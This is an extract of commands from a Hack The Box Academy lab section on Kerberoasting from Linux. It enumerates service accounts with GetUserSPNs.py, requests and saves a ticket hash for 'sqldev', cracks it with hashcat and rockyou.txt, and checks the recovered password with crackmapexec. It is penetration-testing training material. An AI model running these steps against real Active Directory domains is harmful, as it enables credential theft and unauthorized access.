# Section 17: Kerberoasting - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1274
- Code/command blocks: 8

> Terminal output is omitted; only commands & scripts are captured.

```bash
sudo python3 -m pip install .
```

```bash
GetUserSPNs.py -h
```

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
```

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
```

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev
```

```bash
GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
```

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

```bash
sudo crackmapexec smb {{DC_IP}} -u sqldev -p database!
```

